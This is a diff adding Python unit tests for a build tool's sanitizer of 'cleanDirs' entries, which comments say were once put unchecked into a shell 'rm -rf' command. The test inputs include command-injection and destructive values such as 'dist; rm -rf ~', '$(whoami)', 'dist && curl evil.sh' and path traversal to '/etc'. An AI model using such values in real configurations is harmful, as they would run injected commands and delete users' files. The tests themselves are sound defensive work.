@@ -18,6 +18,8 @@ from funbuild.core import util
 from funbuild.core.base import BaseBuild, git_repo_root
 from funbuild.core.cli import funbuild as cli_entry
 from funbuild.core.empty_build import EmptyBuild
+from funbuild.core.flutter_build import FlutterBuild
+from funbuild.core.npm_frontend import NpmFrontendBuild
 from funbuild.core.poetry_build import PoetryBuild
 from funbuild.core.registry import get_build
 from funbuild.core.util import (
@@ -939,3 +941,54 @@ class CleanupKeepsTrackedFilesTest(unittest.TestCase):
 
 if __name__ == "__main__":
     unittest.main()
+
+
+class CleanDirsSanitizeTest(unittest.TestCase):
+    """`funbuild.cleanDirs` 来自 package.json / pubspec.yaml, 原先未经任何校验就
+    f-string 拼进 `rm -rf {d}` 交给 shell。"""
+
+    def safe(self, value):
+        return util.safe_clean_dir(value, source="test")
+
+    def test_relative_path_passes(self):
+        self.assertEqual(self.safe("dist"), "dist")
+        self.assertEqual(self.safe("  build/web  "), "build/web")
+
+    def test_glob_still_allowed(self):
+        """默认清理项本来就有 extbuild/*/dist, 不能把 glob 一并封掉。"""
+        self.assertEqual(self.safe("extbuild/*/dist"), "extbuild/*/dist")
+
+    def test_absolute_path_rejected(self):
+        self.assertIsNone(self.safe("/"))
+        self.assertIsNone(self.safe("/etc"))
+        self.assertIsNone(self.safe("~/Documents"))
+
+    def test_parent_traversal_rejected(self):
+        self.assertIsNone(self.safe("../../etc"))
+        self.assertIsNone(self.safe("build/../../.."))
+
+    def test_shell_metacharacters_rejected(self):
+        self.assertIsNone(self.safe("dist; rm -rf ~"))
+        self.assertIsNone(self.safe("$(whoami)"))
+        self.assertIsNone(self.safe("`id`"))
+        self.assertIsNone(self.safe("dist && curl evil.sh"))
+
+    def test_space_rejected(self):
+        """带空格会被 shell 拆成两个删除目标, 删掉配置里没写的东西。"""
+        self.assertIsNone(self.safe("my build"))
+
+    def test_blank_and_non_string_rejected(self):
+        self.assertIsNone(self.safe("   "))
+        self.assertIsNone(self.safe(None))
+        self.assertIsNone(self.safe(123))
+
+    def test_npm_cmd_delete_filters_unsafe_entries(self):
+        builder = make_builder(NpmFrontendBuild)
+        builder._funbuild_cfg = {"cleanDirs": ["dist", "/etc", "x; rm -rf ~", "extbuild/*/out"]}
+        self.assertEqual(builder._cmd_delete(), ["rm -rf dist", "rm -rf extbuild/*/out"])
+
+    def test_flutter_cmd_delete_filters_unsafe_entries(self):
+        builder = make_builder(FlutterBuild)
+        builder._funbuild_cfg = {"cleanDirs": ["build", "../../"]}
+        with patch.object(FlutterBuild, "_fvm_path_prefix", return_value=[]):
+            self.assertEqual(builder._cmd_delete(), ["rm -rf build"])
